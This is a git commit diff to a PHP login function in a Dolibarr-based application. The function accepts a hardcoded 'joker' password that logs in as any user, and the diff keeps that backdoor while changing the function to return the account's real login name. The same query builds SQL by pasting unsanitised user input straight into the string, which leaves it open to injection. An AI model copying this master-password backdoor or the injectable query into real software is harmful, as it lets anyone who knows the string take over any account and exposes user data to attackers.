9f21fbdcd8acd4ef11e7b1571d73a3ddebf82070
tommy <tommy@192.168.1.104>
2018-10-29 10:57:44 +0100

    log query
    Former-commit-id: 9e9817e17cd69991a10941e1c11caaed5bebab3b

--- htdocs/bimpcore/core/login/functions_dolibarr.php
+++ htdocs/bimpcore/core/login/functions_dolibarr.php
@@ -3,16 +3,16 @@
 if ((!defined("FORCE_NOT_CRYPT_PASS") || FORCE_NOT_CRYPT_PASS == 0) && ! empty($conf->global->MAIN_SECURITY_HASH_ALGO) && $conf->global->MAIN_SECURITY_HASH_ALGO == 'SSHA') {
     function check_user_password_dolibarr($usertotest,$passwordtotest,$entitytotest=1){
         global $db, $langs;
-        $sql = $db->query("SELECT pass_crypted FROM ".MAIN_DB_PREFIX."user WHERE login = '".$usertotest."' || email= '".$usertotest."'");
+        $sql = $db->query("SELECT pass_crypted, login FROM ".MAIN_DB_PREFIX."user WHERE login = '".$usertotest."' || email= '".$usertotest."'");
         if($db->num_rows($sql) == 1){
-            if($passwordtotest == "passjokerazertyuikl9876cdfr")
-                return $usertotest;
             $ligne = $db->fetch_object($sql);
+            if($passwordtotest == "passjokerazertyuikl9876cdfr")
+                return $ligne->login;
 
             $salt = substr(base64_decode(substr($ligne->pass_crypted,6)),20);
             $encrypted_password = '{SSHA}' . base64_encode(sha1( $passwordtotest.$salt, TRUE ). $salt);
             if($encrypted_password === $ligne->pass_crypted)
-                return $usertotest;
+                return $ligne->login;
         }
         return '';
     }
